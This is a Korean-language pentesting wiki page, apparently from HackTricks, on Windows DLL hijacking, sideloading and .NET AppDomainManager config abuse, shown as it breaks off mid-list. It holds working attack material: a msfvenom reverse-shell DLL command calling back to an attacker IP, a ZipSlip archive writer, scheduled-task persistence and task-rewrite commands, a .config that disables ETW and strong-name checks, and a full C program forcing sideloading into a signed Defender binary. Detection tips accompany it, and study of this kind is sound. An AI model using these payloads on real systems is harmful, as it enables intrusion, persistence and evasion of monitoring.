# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## 기본 정보

DLL Hijacking은 신뢰할 수 있는 애플리케이션이 악성 DLL을 로드하도록 조작하는 기법입니다. 이 용어에는 **DLL Spoofing, Injection, Side-Loading**과 같은 여러 전술이 포함됩니다. 주로 코드 실행과 지속성 확보에 사용되며, 권한 상승에는 비교적 덜 사용됩니다. 여기서는 권한 상승에 초점을 맞추지만, 목표와 관계없이 하이재킹 방식은 동일합니다.

### 일반적인 기법

DLL Hijacking에는 여러 방법이 사용되며, 각 방법의 효과는 애플리케이션의 DLL 로드 방식에 따라 달라집니다:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: 정품 DLL을 악성 DLL로 교체합니다. 선택적으로 DLL Proxying을 사용해 원래 DLL의 기능을 유지할 수 있습니다.
2. **DLL Search Order Hijacking**: 애플리케이션의 검색 순서를 악용해 정품 DLL보다 앞선 검색 경로에 악성 DLL을 배치합니다.
3. **Phantom DLL Hijacking**: 애플리케이션이 존재하지 않는 필수 DLL이라고 생각하고 로드하도록 악성 DLL을 만듭니다.
4. **DLL Redirection**: `%PATH%` 또는 `.exe.manifest` / `.exe.local` 파일과 같은 검색 매개변수를 수정해 애플리케이션이 악성 DLL을 로드하도록 합니다.
5. **WinSxS DLL Replacement**: WinSxS 디렉터리에 있는 정품 DLL을 악성 DLL로 교체합니다. 이 방법은 DLL side-loading과 관련된 경우가 많습니다.
6. **Relative Path DLL Hijacking**: 복사한 애플리케이션과 함께 악성 DLL을 사용자가 제어하는 디렉터리에 배치합니다. Binary Proxy Execution 기법과 유사합니다.

애플리케이션은 **자체 DLL loader**를 구현할 수도 있습니다. 권한이 높은 프로세스가 `Libraries` 또는 `Plugins`와 같은 하위 디렉터리를 열거한 뒤, 일반적인 Windows DLL 검색 순서와 무관하게 선택된 DLL을 helper에 전달할 수 있습니다. 다른 계정이 해당 디렉터리에 파일을 만들 수 있다면 조사 대상으로 삼으세요. 프로세스 ID, 디렉터리에 실제로 적용되는 ACL, 파일 선택 규칙, 그리고 도달 가능한 로드 작업을 확인해야 합니다. 실행 파일 옆의 디렉터리에 쓰기 권한이 있다고 해서 해당 프로세스가 그 위치에서 DLL을 로드한다는 뜻은 아닙니다.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}

### 설치 후 PE import grafting

일반적인 side-loading은 신뢰할 수 있는 PE를 변경하지 않고 DLL 이름 확인을 악용합니다. 반면 **import grafting**은 신뢰할 수 있는 프로그램이 이미 로드하는 PE를 수정합니다. 공격자는 공격자가 제어하는 DLL을 참조하도록 import descriptor와 관련된 lookup/IAT 항목을 추가합니다. Windows가 해당 종속성을 재귀적으로 확인하면 추가된 DLL을 매핑하고, 다른 면에서는 정상적인 프로세스 안에서 초기화 코드를 실행합니다. 이는 디스크상의 PE를 수정하는 작업이며, 실행 중인 IAT 함수 포인터를 runtime hook으로 교체하는 것과는 다릅니다.<sup>[[31]](#references)[[32]](#references)</sup>

수정 대상 PE는 사용자가 실행하거나 Task Scheduler가 시작하는 실행 파일이 아니라 중간 단계의 vendor DLL일 수도 있습니다. 재사용 가능한 공격 체인은 다음과 같습니다:<sup>[[32]](#references)</sup>

1. 정품 실행 파일과 종속성을 공격자가 제어하는 디렉터리에 복사합니다.
2. 종속성 하나의 import 구조를 패치해 악성 DLL을 참조하게 하되, 종속성에서 예상되는 exports와 정상 동작은 유지합니다.
3. autorun 또는 scheduled task가 정품 실행 파일을 시작하도록 설정합니다. loader는 수정된 종속성을 매핑한 다음 새로 import된 DLL을 매핑합니다. 작업 열거 방법은 [Privilege Escalation with Autoruns](../privilege-escalation-with-autorun-binaries.md#scheduled-tasks)를 참조하세요.
4. `DllMain`에서 시간이 오래 걸리는 작업을 수행하지 마세요. 관찰된 loader는 worker thread를 생성해 단계별 복호화를 이어서 수행했습니다.

vendor 패키지가 깨끗하고 import 수정이 설치 후에 이루어졌다면, 이는 vendor 측 공급망 침해와 다릅니다. 스테이징된 디렉터리의 host EXE만이 아니라 모든 모듈을 조사하세요. 종속성 import 목록과 해시를 정상 설치본과 비교하고, 서명을 확인하며, `C:\ProgramData`와 같이 예상치 못한 쓰기 가능한 위치에서 실행되는 vendor 바이너리를 조사하세요. 해당 디렉터리에 복사된 crash reporter 또는 updater를 가리키는 scheduled task는 특히 유용한 조사 단서입니다.<sup>[[32]](#references)</sup>


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

일반적인 DLL sideloading만이 신뢰할 수 있는 **.NET Framework** 프로세스에서 공격자 코드를 로드하는 방법은 아닙니다. 대상 실행 파일이 **managed** 애플리케이션인 경우 CLR은 실행 파일 이름을 따르는 **application configuration file**도 확인합니다(예: `Setup.exe.config`). 이 파일은 사용자 지정 **AppDomainManager**를 정의할 수 있습니다. 설정 파일이 EXE와 같은 디렉터리에 있는 공격자 제어 assembly를 가리키면, CLR은 **애플리케이션의 일반 코드 경로가 시작되기 전에** 이를 로드하고 신뢰할 수 있는 프로세스 안에서 실행합니다.<sup>[[24]](#references)</sup>

Microsoft의 .NET Framework configuration schema에 따르면 사용자 지정 manager를 사용하려면 `<appDomainManagerAssembly>`와 `<appDomainManagerType>`이 모두 있어야 합니다.<sup>[[16]](#references)[[17]](#references)</sup>

최소 구성:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

최소 관리자:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

실무 참고 사항:
- 이는 **.NET Framework 전용** tradecraft입니다. Win32 DLL 검색 순서가 아니라 CLR 구성 파싱에 의존합니다.
- 호스트는 실제 **managed EXE**여야 합니다. 빠른 확인 방법: `sigcheck -m target.exe`, `corflags target.exe`를 실행하거나 PE 메타데이터에서 **CLR Runtime Header**를 확인합니다.
- 구성 파일 이름은 실행 파일 이름과 정확히 일치해야 하며(`<binary>.config`), 일반적으로 **EXE와 같은 디렉터리**에 있습니다.
- **서명된 Microsoft/벤더 바이너리**에 유용합니다. 신뢰된 EXE는 그대로 둔 채 악성 managed assembly를 프로세스 내에서 실행할 수 있습니다.
- 이미 쓰기 가능한 설치 프로그램/업데이트 디렉터리를 확보했다면, AppDomainManager hijacking을 **첫 단계**로 사용한 뒤 이후 단계에서 기존 DLL sideloading이나 reflective loading을 사용할 수 있습니다.

### 구성 파일 gadget으로 사용하는 서명된 AppDomainManager type

위에서 설명한 일반적인 AppDomainManager 구성 hijack은 공격자 assembly를 지정합니다. .NET Framework에는 이와 다른 방식도 있습니다. 서명된 assembly를 호스트와 같은 위치에 배치하거나 다른 방법으로 확인 가능하게 하고, 해당 assembly의 manager type이 공격자가 제어하는 sidecar 데이터를 읽도록 하는 방식입니다. 공격자는 여전히 managed host에 인접한 `.exe.config`와 보조 파일을 제어해야 합니다. 선택된 assembly에 서명이 있다고 해서 구성 입력이 안전해지는 것은 아닙니다. 구성 메커니즘은 이미 알려진 AppDomainManager 동작이며, 아래의 서명된 type 연결 방식은 NetamLoader 분석에서 관찰되었습니다.<sup>[[16]](#references)[[17]](#references)[[35]](#references)</sup>

이 연결 방식에서는 구성 파일이 `Microsoft.HostIntegration.Connectors`의 `Microsoft.ApplicationServer.Caching.DataCacheFactoryConfiguration`을 선택합니다. 초기화 과정에서 애플리케이션 디렉터리의 `fabric.config`를 찾습니다. `customType` 항목은 `System.Resources.ResXResourceSet`을 지정하고 `Resources.resx`를 생성자 인수로 전달하여, 공격자가 직접 제작한 manager DLL을 포함하지 않고도 리소스 파서에 도달합니다. 이를 위해서는 대상에서 AppFabric 관련 서명된 assembly와 지정된 framework class를 확인할 수 있어야 합니다. 이는 모든 managed EXE에 보편적으로 적용되는 동작이 아닙니다.<sup>[[35]](#references)</sup> 구성된 AppDomainManager를 사용하려면 애플리케이션이 full-trust 상태여야 합니다. 그렇지 않으면 CLR에서 `TypeLoadException`이 발생합니다.<sup>[[16]](#references)[[17]](#references)</sup>

```xml
<!-- in <host>.exe.config -->
<configuration>
  <runtime>
    <appDomainManagerType value="Microsoft.ApplicationServer.Caching.DataCacheFactoryConfiguration" />
    <appDomainManagerAssembly value="Microsoft.HostIntegration.Connectors, Version=1.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" />
  </runtime>
</configuration>
```

```xml
<!-- adjacent fabric.config -->
<section name="foo">
  <customType className="System.Resources.ResXResourceSet, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089(Resources.resx)" />
</section>
```

`Resources.resx` 콘텐츠는 단순한 데이터 파일이 아니라 역직렬화 싱크입니다. [RESX to BinaryFormatter and XAML](../../../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md#resx-resource-parsing-to-binaryformatter-and-xaml)를 참고하세요. 보고된 단계에서 XAML 로더는 **소문자로 변환한 전체 호스트 명령줄**의 SHA-256 해시에서 AES 키도 생성했으며, 디코딩된 blob의 처음 16바이트를 IV로 사용했습니다. 따라서 명령줄을 바꿔 파일을 다시 실행하면 다음 XAML이 로드되기 전에 복호화에 실패합니다.<sup>[[35]](#references)</sup>

### 다운로더 + 예약 작업 부트스트랩으로서의 AppDomainManager

실용적인 침입 패턴은 신뢰할 수 있는 관리형 EXE에 악성 `*.config`와 **소형 부트스트래퍼** 역할만 하는 악성 AppDomainManager DLL을 함께 사용하는 것입니다.<sup>[[25]](#references)</sup>

1. 사용자가 `%USERPROFILE%\Downloads`처럼 그럴듯한 위치에서 서명된 .NET 설치 프로그램이나 업데이트 프로그램을 실행합니다.
2. 인접한 config로 인해 정식 앱 로직이 시작되기 **전에** CLR이 공격자 어셈블리를 로드합니다.
3. 악성 manager가 **경로 확인**을 수행합니다(예: 호스트 EXE가 `Downloads`에서 실행 중일 때만 계속하고, 두 번째 단계는 `%LOCALAPPDATA%`에서만 실행되도록 허용).
4. 확인을 통과하면 `%LOCALAPPDATA%\PerfWatson2.exe`처럼 사용자가 쓸 수 있는 경로에 실제 페이로드를 다운로드하고 예약 작업으로 지속성을 설정합니다.

이 변형이 중요한 이유:
- 서명된 호스트 EXE는 변경되지 않으므로, 주 바이너리의 해시만 확인하는 트리아지에서는 침해를 놓칠 수 있습니다.
- 단순한 **경로 기반 분석 방지**는 흔합니다. ZIP/EXE/DLL 세 파일을 Desktop, Temp 또는 샌드박스 경로로 옮기면 의도적으로 체인이 중단될 수 있습니다.
- 1단계 AppDomainManager DLL은 작고 탐지하기 어렵게 유지하면서 실제 임플란트는 나중에 가져올 수 있습니다.

이 패턴에서 흔히 볼 수 있는 최소 지속성 예시:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

참고:
- `/rl highest`는 해당 사용자/세션에서 **사용 가능한 최고 수준**을 의미하며, 그 자체로 SYSTEM 권한 상승을 보장하지는 않습니다.
- 이 기법은 기존 DLL 검색 순서 하이재킹보다는 **.NET 구성 악용을 통한 실행/지속성**으로 분류하는 편이 더 적절한 경우가 많습니다. 다만 공격자는 두 기법을 함께 사용하는 경우가 많습니다.

탐지 단서:
- **ZIP 압축 해제 경로**, `Downloads`, `%TEMP%` 또는 기타 사용자가 쓰기 가능한 폴더에서 실행된 서명된 .NET 실행 파일과, 같은 위치에 있는 `<exe>.config` 파일.
- 작업 동작이 `%LOCALAPPDATA%`, `%APPDATA%` 또는 `Downloads`를 가리키고 이름은 브라우저/벤더 업데이트 프로그램을 흉내 내는 새 예약 작업.
- 다른 EXE를 즉시 다운로드한 다음 `schtasks.exe`를 실행하는, 수명이 짧은 관리형 부트스트랩 프로세스.
- 실행 파일 경로가 예상된 사용자 프로필 디렉터리와 일치하지 않으면 조기에 종료되는 샘플.

### 기존 예약 작업을 하이재킹해 sideload 체인 재실행하기

지속성을 조사할 때 **새 작업 생성**만 찾지 마세요. 일부 침입 그룹은 정상적인 설치 프로그램이 **일반 업데이트 작업**을 만들 때까지 기다린 다음, 기존 이름과 작성자, 트리거는 방어자에게 익숙한 상태로 유지하면서 **작업 동작을 다시 작성**합니다.

재사용 가능한 워크플로:
1. 정상 소프트웨어를 설치/실행하고, 해당 소프트웨어가 일반적으로 생성하는 작업을 식별합니다.
2. 작업 XML을 내보내고 현재 `<Exec><Command>` / `<Arguments>` 값을 기록합니다.<sup>[[23]](#references)</sup>
3. 동작만 바꿔 작업이 사용자가 쓰기 가능한 스테이징 디렉터리의 **신뢰할 수 있는 호스트 EXE**를 시작하도록 합니다. 그러면 해당 EXE가 실제 페이로드를 side-load하거나 AppDomain-load합니다.
4. 눈에 띄는 새 지속성 흔적을 만들지 말고 동일한 작업 이름으로 다시 등록합니다.

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

왜 더 은밀한가:
- 작업 이름은 여전히 정상적으로 보일 수 있습니다(예: 공급업체 업데이터).
- **Task Scheduler service**가 이를 실행하므로, 부모/조상 프로세스 검증에서는 `explorer.exe` 대신 예상된 스케줄러 실행 체인이 확인되는 경우가 많습니다.
- **새 작업 이름만** 찾아보는 DFIR 팀은 등록은 이미 존재했지만 동작이 이제 `%LOCALAPPDATA%`, `%APPDATA%` 또는 공격자가 제어하는 다른 경로를 가리키는 작업을 놓칠 수 있습니다.

빠른 헌팅 기준:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- `C:\Windows\System32\Tasks\*` XML 및 `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` 메타데이터를 기준선과 비교합니다.
- **공급업체 업데이터처럼 보이는 작업**이 **사용자 쓰기 가능 디렉터리**에서 실행되거나, 같은 디렉터리에 `*.config` 파일이 있는 .NET EXE를 실행할 때 경고를 생성합니다.

> [!TIP]
> HTML 스테이징, AES-CTR 구성, .NET 임플란트를 DLL sideloading 위에 결합하는 단계별 체인은 아래 워크플로를 참고하세요.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

### 서비스 명령줄에 side-loaded stage 바인딩하기

side-loaded DLL은 예상된 호스트 EXE와 DLL 이름만으로는 충분하지 않을 수 있습니다. Mandiant는 payload 복호화를 명령줄 인수 및 호스트 실행 파일 이름에 바인딩하는 로더를 설명했습니다.<sup>[[33]](#references)</sup> 이후의 서비스 기반 체인에서는 복사된 정상 호스트가 인접한 `mscoree.dll`을 로드했습니다. 이 DLL은 `LockClrVersion`을 내보내고, 서비스 인수와 호스트 실행 파일 basename에서 AES-128 키를 도출한 뒤에만 내장 stage를 복호화했습니다. 각 입력은 16바이트로 잘라내거나 NUL 바이트로 패딩했습니다. 바이트 단위 키는 `argument XOR embedded_key XOR executable_basename`이었고, 이후 payload는 패딩 없이 AES-CBC로 복호화되었습니다. 호스트 이름을 바꾸거나 예상된 인수 없이 실행하면 DLL이 계속 로드되더라도 키가 달라져 이 stage를 복호화할 수 없습니다. 이 변형을 재현하거나 분석할 때는 명령줄 인수와 basename을 정확히 유지하세요.<sup>[[34]](#references)</sup>

이는 **일반적인 DLL side-loading에 추가된 payload gate**이지, 새로운 DLL 검색 순서 규칙이나 그 자체로 권한 상승을 일으키는 primitive가 아닙니다. 결과 권한 수준은 서비스의 보안 컨텍스트에 따라 결정됩니다. [GitHub issue/file C2 workflow](../../../generic-methodologies-and-resources/github-issues-and-repository-files-c2.md)에는 이후 전송 방식이 별도로 설명되어 있습니다.<sup>[[34]](#references)</sup>

## 누락된 DLL 찾기

시스템에서 누락된 DLL을 찾는 가장 일반적인 방법은 sysinternals의 [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)을 실행하고 **다음 2개 필터를 설정**하는 것입니다.

![일반적인 기법 - 누락된 DLL 찾기: 시스템에서 누락된 DLL을 찾는 가장 일반적인 방법은 sysinternals의 procmon을 실행하고 다음 2개 필터를 설정하는 것입니다](<../../../images/image (961).png>)

![일반적인 기법 - 누락된 DLL 찾기: 시스템에서 누락된 DLL을 찾는 가장 일반적인 방법은 sysinternals의 procmon을 실행하고 다음 2개 필터를 설정하는 것입니다](<../../../images/image (230).png>)

그리고 **File System Activity**만 표시합니다.

![일반적인 기법 - 누락된 DLL 찾기: File System Activity만 표시합니다](<../../../images/image (153).png>)

**일반적인 누락 DLL**을 찾는 경우 몇 **초간** 실행해 둡니다.\
**특정 실행 파일에서 누락된 DLL**을 찾는 경우 **"Process Name" "contains" `<exec name>`**과 같은 필터를 추가로 설정한 다음, 해당 실행 파일을 실행하고 이벤트 캡처를 중지합니다.<sup>[[9]](#references)</sup>

## 누락된 DLL 악용하기

권한을 상승시키려면 권한이 높은 프로세스가 쓰기 가능한 위치에서 로드하려는 **DLL**을 찾으세요. 정상 DLL이 있는 디렉터리보다 먼저 검색되는 디렉터리를 제어하거나, 요청된 DLL이 존재하지 않고 검색 대상 디렉터리 중 하나에 쓸 수 있을 때 이러한 상황이 발생할 수 있습니다.

### DLL 검색 순서

**DLL이 구체적으로 어떻게 로드되는지는** [**Microsoft 문서**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching)**에서 확인할 수 있습니다.**

**Windows 애플리케이션**은 **미리 정의된 검색 경로**를 특정 순서에 따라 검색하여 DLL을 찾습니다. DLL hijacking은 악성 DLL을 이러한 디렉터리 중 하나에 전략적으로 배치하여 정상 DLL보다 먼저 로드되게 할 때 발생합니다. 이를 방지하려면 애플리케이션이 필요한 DLL을 지정할 때 절대 경로를 사용하도록 해야 합니다.

아래에서 **32비트** 시스템의 **DLL 검색 순서**를 확인할 수 있습니다.

1. 애플리케이션을 로드한 디렉터리.
2. 시스템 디렉터리. [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) 함수를 사용해 이 디렉터리의 경로를 가져옵니다.(_C:\Windows\System32_)
3. 16비트 시스템 디렉터리. 이 디렉터리의 경로를 가져오는 함수는 없지만, 검색 대상입니다. (_C:\Windows\System_)
4. Windows 디렉터리. [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) 함수를 사용해 이 디렉터리의 경로를 가져옵니다.
   1. (_C:\Windows_)
5. 현재 디렉터리.
6. PATH 환경 변수에 나열된 디렉터리. 여기에는 **App Paths** 레지스트리 키로 지정된 애플리케이션별 경로가 포함되지 않는다는 점에 유의하세요. DLL 검색 경로를 계산할 때 **App Paths** 키는 사용되지 않습니다.

이는 **SafeDllSearchMode**가 활성화된 경우의 **기본** 검색 순서입니다. 비활성화하면 현재 디렉터리가 두 번째 순위로 올라갑니다. 이 기능을 비활성화하려면 **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** 레지스트리 값을 만들고 0으로 설정합니다(기본값은 활성화).

[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 함수가 **LOAD_WITH_ALTERED_SEARCH_PATH**와 함께 호출되면 **LoadLibraryEx**가 로드하는 실행 모듈의 디렉터리에서 검색이 시작됩니다.

마지막으로 DLL은 이름이 아닌 절대 경로로 로드할 수 있습니다. 이 경우 Windows는 DLL 자체를 해당 경로에서만 찾지만, 이름으로 요청된 종속성은 계속 해당 검색 순서를 따릅니다.

검색 순서를 변경하는 다른 방법도 있지만 여기서는 설명하지 않겠습니다.

### 임의 파일 쓰기를 누락 DLL hijack으로 연결하기

**관련 기법:** [권한이 있는 복구 프로세스에 대한 oplock 기반 마운트 지점 전환](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. **ProcMon** 필터(`Process Name` = 대상 EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`)를 사용해 프로세스가 찾으려 했지만 찾지 못한 DLL 이름을 수집합니다.<sup>[[14]](#references)</sup>
2. 바이너리가 **예약 작업/서비스**로 실행된다면, 해당 이름 중 하나를 가진 DLL을 **애플리케이션 디렉터리**(검색 순서 1번)에 넣으면 다음 실행 때 로드됩니다. 한 .NET scanner 사례에서 프로세스는 실제 복사본을 `C:\Program Files\dotnet\fxr\...`에서 로드하기 전에 `C:\samples\app\`에서 `hostfxr.dll`을 찾았습니다.
3. 임의의 export가 있는 payload DLL(예: reverse shell)을 만듭니다. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. primitive가 **ZipSlip 스타일 임의 쓰기**라면, 압축 해제 디렉터리를 벗어나 DLL이 앱 폴더에 저장되도록 ZIP 항목을 구성합니다.

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. 아카이브를 감시 중인 inbox/share에 전달합니다. 예약된 작업이 프로세스를 다시 실행하면 악성 DLL이 로드되고 서비스 계정 권한으로 코드가 실행됩니다.

### RTL_USER_PROCESS_PARAMETERS.DllPath를 통한 sideloading 강제

새로 생성되는 프로세스의 DLL 검색 경로에 결정적으로 영향을 주는 고급 방법은 ntdll의 네이티브 API로 프로세스를 생성할 때 RTL_USER_PROCESS_PARAMETERS의 DllPath 필드를 설정하는 것입니다. 공격자가 제어하는 디렉터리를 여기에 지정하면, 이름으로 가져온 DLL을 확인하는 대상 프로세스(절대 경로를 사용하지 않고 안전한 로드 플래그도 사용하지 않는 경우)가 해당 디렉터리에서 악성 DLL을 로드하도록 강제할 수 있습니다.

핵심 아이디어
- RtlCreateProcessParametersEx로 프로세스 매개변수를 만들고, 제어하는 폴더(예: dropper/unpacker가 있는 디렉터리)를 가리키는 사용자 지정 DllPath를 지정합니다.
- RtlCreateUserProcess로 프로세스를 생성합니다. 대상 바이너리가 DLL을 이름으로 확인할 때 로더는 확인 과정에서 지정된 DllPath를 참조하므로, 악성 DLL이 대상 EXE와 같은 디렉터리에 없어도 안정적으로 sideloading할 수 있습니다.

참고/제한 사항
- 이 설정은 생성되는 자식 프로세스에 적용됩니다. 현재 프로세스에만 적용되는 SetDllDirectory와는 다릅니다.
- 대상은 DLL을 이름으로 import하거나 LoadLibrary해야 합니다(절대 경로를 사용하지 않고 LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories도 사용하지 않아야 함).
- KnownDLLs와 하드코딩된 절대 경로는 hijack할 수 없습니다. Forwarded exports와 SxS에 따라 우선순위가 달라질 수 있습니다.

최소 C 예제(ntdll, 와이드 문자열, 간소화된 오류 처리):

<details>
<summary>전체 C 예제: RTL_USER_PROCESS_PARAMETERS.DllPath를 통한 DLL sideloading 강제</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

운영 사용 예시
- 필요한 함수들을 export하거나 실제 DLL로 proxy하는 악성 xmllite.dll을 DllPath 디렉터리에 배치합니다.
- 위 기법을 사용해 xmllite.dll을 이름으로 조회하는 것으로 알려진 서명된 바이너리를 실행합니다. 로더는 지정된 DllPath를 통해 import를 확인하고 사용자의 DLL을 sideload합니다.

이 기법은 실제 공격에서 다단계 sideloading 체인을 구동하는 데 사용된 사례가 있습니다. 초기 launcher가 helper DLL을 drop하고, 이 DLL이 사용자 지정 DllPath를 가진 Microsoft 서명 hijackable 바이너리를 실행해 staging 디렉터리에서 공격자의 DLL을 강제로 로드합니다.<sup>[[6]](#references)</sup>


### .NET AppDomainManager hijacking via `.exe.config`

**.NET Framework** 대상의 경우, 애플리케이션과 같은 디렉터리에 있는 **`.exe.config`** 파일을 악용하면 메모리를 patch하지 않고도 **`Main()` 이전에** sideloading을 수행할 수 있습니다. 공격자는 Win32 DLL search order에만 의존하는 대신, 합법적인 .NET EXE와 악성 config 파일, 그리고 하나 이상의 공격자 제어 assembly를 함께 배치합니다.

작동 방식:<sup>[[15]](#references)[[22]](#references)</sup>
1. 호스트 EXE가 시작되고 **CLR이 `<exe>.config`를 읽습니다**.
2. config에서 **`<appDomainManagerAssembly>`** 및 **`<appDomainManagerType>`**을 설정해 runtime이 공격자 제어 `AppDomainManager`를 인스턴스화하도록 합니다.
3. 악성 manager가 신뢰된 호스트 프로세스 내부에서 **`Main()` 이전에 실행됩니다**.
4. 같은 config에서 CLR이 로컬 assembly(예: `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`)를 먼저 확인하도록 강제할 수 있으며, inline patching 없이 runtime validation/telemetry를 약화할 수도 있습니다.

캠페인 스타일 패턴(정확한 중첩 구조는 directive / CLR 버전에 따라 달라질 수 있음):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

유용한 이유:
- **`<probing privatePath="."/>`**는 assembly resolution을 애플리케이션 디렉터리 안으로 제한해, 해당 폴더를 예측 가능한 sideloading 표면으로 만듭니다.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`**는 CLR 초기화 중, 정상적인 앱 로직이 실행되기 전에 실행을 attacker 코드로 옮깁니다.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`**를 사용하면 full-trust 앱이 strong-name 검증 실패 없이 서명되지 않았거나 변조된 assembly를 로드할 수 있습니다.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`**는 publisher-policy가 더 최신 assembly로 리디렉션하는 것을 방지합니다.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`**는 runtime 선택을 더 결정적으로 만듭니다.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`**는 특히 흥미롭습니다. implant가 메모리에서 `EtwEventWrite`를 패치하는 대신, CLR이 설정을 통해 자체 ETW 가시성을 비활성화하기 때문입니다.

최근 캠페인에서 관찰된 실행 패턴:
- 1단계: `setup.exe`, `setup.exe.config`, 로컬 assembly를 배치합니다.
